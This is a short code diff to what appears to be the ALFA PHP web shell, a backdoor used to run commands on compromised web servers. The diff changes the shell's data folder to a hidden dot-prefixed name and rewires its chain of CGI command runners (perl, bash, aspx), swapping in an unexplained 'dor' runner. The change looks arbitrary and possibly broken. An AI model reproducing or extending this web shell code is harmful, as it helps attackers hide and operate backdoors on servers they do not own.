@@ -162,7 +162,7 @@ if(!isset($GLOBALS['DB_NAME']['post_encryption']))exit('$GLOBALS[\'DB_NAME\'][\'
 define("__ALFA_VERSION__", "4.1");
 define("__ALFA_UPDATE__", "2");
 define("__ALFA_CODE_NAME__", "XXVI");
-define("__ALFA_DATA_FOLDER__", "jancox");
+define("__ALFA_DATA_FOLDER__", ".xxvib");
 define("__ALFA_POST_ENCRYPTION__", (isset($GLOBALS["DB_NAME"]["post_encryption"])&&$GLOBALS["DB_NAME"]["post_encryption"]==true?true:false));
 define("__ALFA_SECRET_KEY__", __ALFA_POST_ENCRYPTION__?_AlfaSecretKey():'');
 $GLOBALS['__ALFA_COLOR__'] = array(
@@ -649,8 +649,8 @@ if(@preg_match("/<pre>(.*?)<\/pre>/s", $data, $res)){
 $out = $res[1];
 }
 }elseif($lang=="perl"){
-return _alfa_cgicmd($cmd_pure,"py",$set_cookie);
-}elseif($lang=="py"){
+return _alfa_cgicmd($cmd_pure,"dor",$set_cookie);
+}elseif($lang=="dor"){
 return _alfa_cgicmd($cmd_pure,"bash",$set_cookie);
 }elseif($lang=="bash" && $GLOBALS['sys']=="win"){
 return _alfa_cgicmd($cmd_pure,"aspx",$set_cookie);
